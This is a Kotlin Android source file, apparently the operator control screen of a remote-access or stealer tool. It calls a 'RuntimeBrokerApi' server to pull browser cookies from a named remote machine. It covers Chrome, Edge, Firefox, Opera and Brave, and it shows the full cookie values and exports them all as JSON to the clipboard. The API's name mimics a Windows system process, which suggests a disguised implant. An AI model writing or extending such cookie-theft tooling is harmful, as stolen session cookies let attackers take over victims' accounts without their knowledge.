package com.mimo.pro

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.view.View
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.lifecycle.lifecycleScope
import com.mimo.pro.api.RuntimeBrokerApi
import com.mimo.pro.databinding.ActivityCookiesBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class CookiesActivity : BaseActivity() {

    private lateinit var binding: ActivityCookiesBinding
    private var machineName = ""
    private var allCookies: List<CookieItem> = emptyList()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityCookiesBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        machineName = intent.getStringExtra(MainActivity.EXTRA_MACHINE).orEmpty()
        supportActionBar?.title = getString(R.string.cookies_title)

        setupBrowserFilter()
        binding.btnExtractCookies.setOnClickListener { extractCookies() }
        binding.btnSaveCookies.setOnClickListener { saveCookies() }
        binding.btnClearCookies.setOnClickListener { clearCookies() }
    }

    private fun setupBrowserFilter() {
        val browsers = arrayOf("All", "Chrome", "Edge", "Firefox", "Opera", "Brave")
        binding.spinnerBrowser.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, browsers).also {
            it.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        }
        binding.spinnerBrowser.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                filterCookies(browsers[position])
            }
            override fun onNothingSelected(parent: AdapterView<*>?) {}
        }
    }

    private fun extractCookies() {
        binding.progressBar.visibility = View.VISIBLE
        binding.btnExtractCookies.isEnabled = false
        binding.rvCookies.visibility = View.GONE
        binding.tvEmptyState.visibility = View.GONE

        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = Prefs.serverUrl(this@CookiesActivity)
                val pw = Prefs.password(this@CookiesActivity)
                val result = RuntimeBrokerApi.extractCookies(url, machineName, pw)

                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.btnExtractCookies.isEnabled = true

                    if (result != null && result.success && result.cookies != null) {
                        parseCookies(result.cookies!!)
                        binding.tvCookieCount.text = getString(R.string.cookies_found, allCookies.size)
                        binding.cookieStats.visibility = View.VISIBLE
                        binding.rvCookies.visibility = View.VISIBLE
                    } else {
                        binding.tvEmptyState.text = getString(R.string.cookies_extract_failed, result?.error ?: "Unknown error")
                        binding.tvEmptyState.visibility = View.VISIBLE
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.btnExtractCookies.isEnabled = true
                    binding.tvEmptyState.text = getString(R.string.cookies_extract_failed, e.message)
                    binding.tvEmptyState.visibility = View.VISIBLE
                }
            }
        }
    }

    private fun parseCookies(jsonString: String) {
        try {
            val jsonArray = JSONArray(jsonString)
            val items = mutableListOf<CookieItem>()
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                items.add(CookieItem(
                    domain = obj.optString("domain", ""),
                    name = obj.optString("name", ""),
                    value = obj.optString("value", ""),
                    path = obj.optString("path", ""),
                    expires = obj.optString("expires", ""),
                    isSecure = obj.optBoolean("secure", false),
                    isHttpOnly = obj.optBoolean("httpOnly", false),
                    browser = obj.optString("browser", "Unknown")
                ))
            }
            allCookies = items
            filterCookies("All")
        } catch (e: Exception) {
            allCookies = emptyList()
            binding.rvCookies.visibility = View.GONE
            binding.tvEmptyState.text = getString(R.string.cookies_parse_failed, e.message)
            binding.tvEmptyState.visibility = View.VISIBLE
        }
    }

    private fun filterCookies(filter: String) {
        val filtered = if (filter == "All") {
            allCookies
        } else {
            allCookies.filter { it.browser.equals(filter, ignoreCase = true) }
        }

        if (filtered.isEmpty()) {
            binding.rvCookies.visibility = View.GONE
            binding.tvEmptyState.text = if (allCookies.isEmpty()) getString(R.string.cookies_no_data) else getString(R.string.cookies_no_match, filter)
            binding.tvEmptyState.visibility = View.VISIBLE
        } else {
            binding.tvEmptyState.visibility = View.GONE
            binding.rvCookies.visibility = View.VISIBLE
            binding.rvCookies.adapter = CookiesAdapter(filtered) { item ->
                showCookieDetails(item)
            }
        }
    }

    private fun showCookieDetails(item: CookieItem) {
        val dialogView = layoutInflater.inflate(com.mimo.pro.R.layout.dialog_cookie_details, null)
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieDomain).text = item.domain
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieName).text = item.name
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieValue).text = item.value
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookiePath).text = item.path
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieExpires).text = item.expires
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieSecure).text = getString(R.string.cookies_secure, item.isSecure.toString())
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieHttpOnly).text = getString(R.string.cookies_httponly, item.isHttpOnly.toString())
        dialogView.findViewById<android.widget.TextView>(com.mimo.pro.R.id.tvCookieBrowser).text = getString(R.string.cookies_browser, item.browser)

        AlertDialog.Builder(this)
            .setTitle(R.string.cookie_details)
            .setView(dialogView)
            .setPositiveButton(R.string.copy_value) { _, _ ->
                val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("Cookie Value", item.value))
                Toast.makeText(this, R.string.copied, Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton(R.string.close, null)
            .show()
    }

    private fun saveCookies() {
        if (allCookies.isEmpty()) {
            Toast.makeText(this, R.string.cookies_no_data, Toast.LENGTH_SHORT).show()
            return
        }

        val jsonArray = JSONArray()
        allCookies.forEach { item ->
            jsonArray.put(JSONObject().apply {
                put("domain", item.domain)
                put("name", item.name)
                put("value", item.value)
                put("path", item.path)
                put("expires", item.expires)
                put("secure", item.isSecure)
                put("httpOnly", item.isHttpOnly)
                put("browser", item.browser)
            })
        }

        val jsonString = jsonArray.toString(2)
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(ClipData.newPlainText("Mimo Cookies Export", jsonString))
        Toast.makeText(this, R.string.cookies_saved_clipboard, Toast.LENGTH_SHORT).show()
    }

    private fun clearCookies() {
        allCookies = emptyList()
        binding.rvCookies.visibility = View.GONE
        binding.cookieStats.visibility = View.GONE
        binding.tvEmptyState.text = getString(R.string.cookies_no_data)
        binding.tvEmptyState.visibility = View.VISIBLE
        Toast.makeText(this, R.string.cookies_cleared, Toast.LENGTH_SHORT).show()
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }

    data class CookieItem(
        val domain: String,
        val name: String,
        val value: String,
        val path: String,
        val expires: String,
        val isSecure: Boolean,
        val isHttpOnly: Boolean,
        val browser: String
    )

    class CookiesAdapter(
        private val items: List<CookieItem>,
        private val onClick: (CookieItem) -> Unit
    ) : androidx.recyclerview.widget.RecyclerView.Adapter<CookiesAdapter.VH>() {

        class VH(view: View) : androidx.recyclerview.widget.RecyclerView.ViewHolder(view) {
            val tvDomain: android.widget.TextView = view.findViewById(com.mimo.pro.R.id.tvCookieItemDomain)
            val tvName: android.widget.TextView = view.findViewById(com.mimo.pro.R.id.tvCookieItemName)
            val tvBrowser: android.widget.TextView = view.findViewById(com.mimo.pro.R.id.tvCookieItemBrowser)
            val ivSecure: android.widget.ImageView = view.findViewById(com.mimo.pro.R.id.ivCookieSecure)
            val ivHttpOnly: android.widget.ImageView = view.findViewById(com.mimo.pro.R.id.ivCookieHttpOnly)
        }

        override fun onCreateViewHolder(parent: android.view.ViewGroup, viewType: Int): VH {
            val view = android.view.LayoutInflater.from(parent.context).inflate(com.mimo.pro.R.layout.item_cookie, parent, false)
            return VH(view)
        }

        override fun onBindViewHolder(holder: VH, position: Int) {
            val item = items[position]
            holder.tvDomain.text = item.domain
            holder.tvName.text = "${item.name} = ${item.value.take(30)}${if (item.value.length > 30) "..." else ""}"
            holder.tvBrowser.text = item.browser
            holder.ivSecure.visibility = if (item.isSecure) View.VISIBLE else View.GONE
            holder.ivHttpOnly.visibility = if (item.isHttpOnly) View.VISIBLE else View.GONE
            holder.itemView.setOnClickListener { onClick(item) }
        }

        override fun getItemCount(): Int = items.size
    }
}